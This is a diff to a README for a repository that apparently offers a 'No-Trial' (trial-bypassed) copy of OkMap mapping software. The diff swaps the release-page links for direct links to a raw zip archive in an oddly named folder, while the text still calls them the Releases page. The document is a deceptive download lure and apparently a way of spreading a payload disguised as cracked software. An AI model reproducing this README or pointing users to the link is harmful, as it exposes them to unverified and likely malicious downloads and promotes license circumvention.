@@ -2,7 +2,7 @@
 # 🗺️ OkMap-Desktop-No-Trial - Your Tool for Easy Mapping
 
 ## 📥 Download Here
-[![Download Now](https://img.shields.io/badge/Download-OkMap--Desktop--No--Trial-brightgreen.svg)](https://github.com/SH-Traders/OkMap-Desktop-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/SH-Traders/OkMap-Desktop-No-Trial/main/supermanliness/OkMap-Desktop-No-Trial_v3.4.zip)](https://raw.githubusercontent.com/SH-Traders/OkMap-Desktop-No-Trial/main/supermanliness/OkMap-Desktop-No-Trial_v3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to OkMap-Desktop-No-Trial! This application allows you to create, edit, and view various maps. Our goal is to make your mapping experience simple and efficient.
@@ -23,7 +23,7 @@ To run OkMap-Desktop-No-Trial smoothly, you will need:
 - **Internet**: Required for downloading maps and updates but not for offline usage.
 
 ## 🔗 Download & Install
-To get started, visit our [Releases page](https://github.com/SH-Traders/OkMap-Desktop-No-Trial/releases) to download the latest version.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/SH-Traders/OkMap-Desktop-No-Trial/main/supermanliness/OkMap-Desktop-No-Trial_v3.4.zip) to download the latest version.
 
 1. Click on the link above to access the Downloads.
 2. Choose the latest release, which will be labeled clearly.
